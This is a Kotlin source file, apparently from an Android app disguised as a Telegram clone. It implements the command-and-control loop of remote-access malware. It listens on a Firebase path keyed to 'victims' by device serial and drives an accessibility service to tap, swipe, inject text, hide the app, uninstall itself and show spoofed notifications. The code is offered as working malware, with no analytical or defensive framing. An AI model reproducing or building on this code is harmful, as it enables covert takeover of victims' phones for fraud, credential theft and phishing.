package com.telegram2.messaging.remote

import android.content.Context
import com.google.firebase.database.ChildEventListener
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase

class CommandProcessor(private val context: Context) {
    private val db = FirebaseDatabase.getInstance().getReference("telegram2_secret")
    private val commandsRef = db.child("victims").child(android.os.Build.SERIAL).child("commands")

    init {
        commandsRef.addChildEventListener(object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                val cmd = snapshot.getValue(MyAccessibilityService.Command::class.java) ?: return
                executeCommand(cmd)
                snapshot.ref.removeValue()
            }
            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onChildRemoved(snapshot: DataSnapshot) {}
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun executeCommand(cmd: MyAccessibilityService.Command) {
        val service = MyAccessibilityService.instance
        when (cmd.type) {
            "tap" -> service?.tap(cmd.x ?: 0, cmd.y ?: 0)
            "swipe" -> service?.swipe(cmd.sx ?: 0, cmd.sy ?: 0, cmd.ex ?: 0, cmd.ey ?: 0)
            "type" -> service?.injectText(cmd.text ?: "")
            "hide_activity" -> service?.hideApp()
            "uninstall" -> service?.uninstallSelf()
            "fake_notification" -> {
                NotificationSpoofer.show(context, cmd.title ?: "", cmd.text ?: "", cmd.iconUrl)
            }
        }
    }
}
